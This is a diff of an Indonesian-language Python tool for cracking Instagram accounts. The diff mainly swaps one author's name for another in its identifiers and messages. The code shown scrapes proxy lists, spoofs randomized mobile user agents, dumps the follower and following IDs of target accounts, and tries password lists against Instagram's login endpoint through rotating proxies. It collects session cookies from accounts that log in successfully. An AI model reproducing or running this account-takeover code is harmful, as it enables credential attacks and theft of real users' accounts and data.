@@ -59,7 +59,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
+	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari Itsmeafriliyan');exit()
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Linux; Tizen'
@@ -2684,7 +2684,7 @@ from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
 
 #------------------[ GLOBAL NAME ]-------------------#
 internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
-method, xxkontol, BrayGagah, BrayUarand, proxxy, UserBrayCrack = [], [], [], [], [], []
+method, xxkontol, ItsmeDvanme, ItsmeUaRun, proxxy, UserItsmeafriliyan_dev = [], [], [], [], [], []
 batam=[]
 s = requests.Session()
 day = datetime.now().strftime("%d-%b-%Y")
@@ -2760,7 +2760,7 @@ except FileNotFoundError:
 #------------------[ USER-AGENT ]-------------------#
 USN = "Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Instagram 240.2.0.18.107 Android (28 /9; 480dpi; 1080x2032; HUAWEI; FIG-LX1; HWFIG-H; hi6250; it_IT; 378116740)"
 
-def BrayennnXD():
+def Itsmeafriliyan_dev():
     rr = random.randint
     a1 = random.choice(['SM-G532F','SM-V417I','SM-J400F','SM-T733','SM-F926B'])
     a2 = random.choice(['CPH2059','CPH2001','CPH1909','CPH2269','CPH1729'])
@@ -2781,7 +2781,7 @@ for x in range(1000):
     u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
     u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-M317F Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
     Ua = random.choice([u1, u2, u3, u4, u5, u6])
-    UserBrayCrack.append(Ua)
+    UserItsmeafriliyan_dev.append(Ua)
 
 #------------------[ URL-PROXY ]-------------------#
 try:
@@ -2952,11 +2952,11 @@ class instagram:
 				following=i.split('|')[2]
 			except:
 				pass
-			BrayGagah.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}",width=45,padding=(0,2),style=f"bold white"))
-			BrayGagah.append(Panel(f"{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",width=45,padding=(0,2),style=f"bold white"))
-			console.print(Columns(BrayGagah))
+			ItsmeDvanme.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}",width=45,padding=(0,2),style=f"bold white"))
+			ItsmeDvanme.append(Panel(f"{P2}Pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",width=45,padding=(0,2),style=f"bold white"))
+			console.print(Columns(ItsmeDvanme))
 			prints(Panel(f"{P2}Selamat Datang {H2}{nama} {P2}Gunakan Tools Dengan Bijak :)",width=90,padding=(0,9),style=f"bold white"))
-			prints(Panel(f"{P2}[[bold cyan]01{P2}]. Dump Id Pencarian Nama       {P2}[[bold cyan]05{P2}]. Lihat Hasil Crack\n{P2}[[bold cyan]02{P2}]. Dump Id Pengikut             {P2}[[bold cyan]06{P2}]. Bot Auto Unfollow\n{P2}[[bold cyan]03{P2}]. Dump Id Mengikuti            {P2}[[bold cyan]07{P2}]. Report Bug Script\n{P2}[[bold cyan]04{P2}]. Crack Ulang Hasil Cp         {P2}[[bold cyan]00{P2}]. Keluar Tools",width=90,padding=(0,4),style=f"bold white"))
+			prints(Panel(f"{P2}[[bold cyan]01{P2}]. Dump ID Pencarian Nama       {P2}[[bold cyan]05{P2}]. Lihat Hasil Crack\n{P2}[[bold cyan]02{P2}]. Dump ID Pengikut             {P2}[[bold cyan]06{P2}]. Bot Auto Unfollow\n{P2}[[bold cyan]03{P2}]. Dump Id Mengikuti            {P2}[[bold cyan]07{P2}]. Report Bug Script\n{P2}[[bold cyan]04{P2}]. Crack Ulang Hasil Cp         {P2}[[bold cyan]00{P2}]. Keluar Tools",width=90,padding=(0,4),style=f"bold white"))
 
 			
 	def hapus_lisensi(self):
@@ -3081,7 +3081,7 @@ class instagram:
 	def ifoAPI(self,cookie,api,id):
 		if 'sukses' in  lisensiku:
 			try:
-				x=s.get(api%(id),cookies=cookie,headers={"user-agent":BrayennnXD()})
+				x=s.get(api%(id),cookies=cookie,headers={"user-agent":Itsmeafriliyan_dev()})
 				x_jason=json.loads(x.text)
 				for i in x_jason['users']:
 					username = i["username"]
@@ -3091,7 +3091,7 @@ class instagram:
 				if 'mengikuti' in menudump:
 					maxid=x_jason['next_max_id']
 					for z in range (9999):
-						x=s.get('https://www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":BrayennnXD()})
+						x=s.get('https://www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":Itsmeafriliyan_dev()})
 						x_jason=json.loads(x.text)
 						try:
 							for i in x_jason['users']:
@@ -3220,12 +3220,12 @@ class instagram:
 	def crackAPI(self,user,pas):
 		global loop,success,checkpoint
 		ses=requests.Session()
-		ua = random.choice(UserBrayCrack)
+		ua = random.choice(UserItsmeafriliyan_dev)
 		prog.update(des,description=f"{H2}[API]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
 		prog.advance(des)
 		try:
 			for pw in pas:
-				brayennnxd=random.randint(1000000000, 99999999999)
+				Itsmeafriliyan=random.randint(1000000000, 99999999999)
 				ts = calendar.timegm(current_GMT)
 				proxy = {'http': 'socks5://'+random.choice(proxxy)}
 				p = ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
@@ -3261,7 +3261,7 @@ class instagram:
 				    "trustedDeviceRecords": "{}"}
 				respon=ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
 				Itsmeafriliyan=json.loads(respon.text)
-				if 'userId' in str(brayennnxd):
+				if 'userId' in str(Itsmeafriliyan):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
 					nomor, tanggal = self.ingfo(cookie)
@@ -3304,7 +3304,7 @@ class instagram:
 	def new(self,user,pas):
 		global loop,success,checkpoint
 		ses=requests.Session()
-		ua = random.choice(UserBrayCrack)
+		ua = random.choice(UserItsmeafriliyan_dev)
 		prog.update(des,description=f"{H2}[AJAX]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
 		prog.advance(des)
 		try:
